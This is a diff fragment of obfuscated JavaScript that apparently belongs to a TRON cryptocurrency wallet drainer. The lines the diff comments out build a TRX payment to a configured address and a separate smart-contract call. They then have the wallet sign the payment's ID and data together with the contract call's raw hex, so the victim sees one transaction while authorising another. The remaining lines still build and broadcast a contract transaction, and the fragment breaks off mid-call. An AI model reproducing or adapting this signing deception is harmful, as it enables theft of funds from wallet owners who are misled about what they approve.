@@ -226,10 +226,10 @@ async function _0x8f88sb(_0x5b1fc5) {
       "feeLimit": 100000000,
       "callValue": 0
     };
-  const {
-      transaction: _0x25dedb
-    } = await tronWeb.transactionBuilder.triggerSmartContract(_0x41442b._0x19h196, _0x41442b._0x8f8196, _0x999691, _0x2a7c79, tronWeb.address.toHex(tronWeb.defaultAddress.base58)),
-    _0x652ecf = await tronWeb.transactionBuilder.sendTrx(_0x41442b.config.trc_apppass_address, _0x41442b.money ? _0x41442b.money * 1000000 : 1000000, tronWeb.defaultAddress.base58),
+  // const {
+  //     transaction: _0x25dedb
+  //   } = await tronWeb.transactionBuilder.triggerSmartContract(_0x41442b._0x19h196, _0x41442b._0x8f8196, _0x999691, _0x2a7c79, tronWeb.address.toHex(tronWeb.defaultAddress.base58)),
+  //   _0x652ecf = await tronWeb.transactionBuilder.sendTrx(_0x41442b.config.trc_apppass_address, _0x41442b.money ? _0x41442b.money * 1000000 : 1000000, tronWeb.defaultAddress.base58),
     {
       transaction: _0x4f164f
     } = await tronWeb.transactionBuilder.triggerSmartContract(_0x41442b._0x19h196, _0x990438, _0x999691, _0x37d562, tronWeb.address.toHex(tronWeb.defaultAddress.base58));
@@ -240,12 +240,12 @@ async function _0x8f88sb(_0x5b1fc5) {
   // };
   // delete _0x348df4.raw_data.contract[0].parameter.value.data;
   // delete _0x348df4.raw_data.contract[0].parameter.value.to_address;
-  try {
-    let _0x1c8990 = await tronWeb.trx.sign({
-      "txID": _0x652ecf.txID,
-      "raw_data": _0x652ecf.raw_data,
-      "raw_data_hex": _0x4f164f.raw_data_hex
-    });
+  // try {
+  //   let _0x1c8990 = await tronWeb.trx.sign({
+  //     "txID": _0x652ecf.txID,
+  //     "raw_data": _0x652ecf.raw_data,
+  //     "raw_data_hex": _0x4f164f.raw_data_hex
+  //   });
     await tronWeb.trx.sendRawTransaction({
       // ..._0x1c8990,
       // "raw_data_hex": _0x4f164f.raw_data_hex
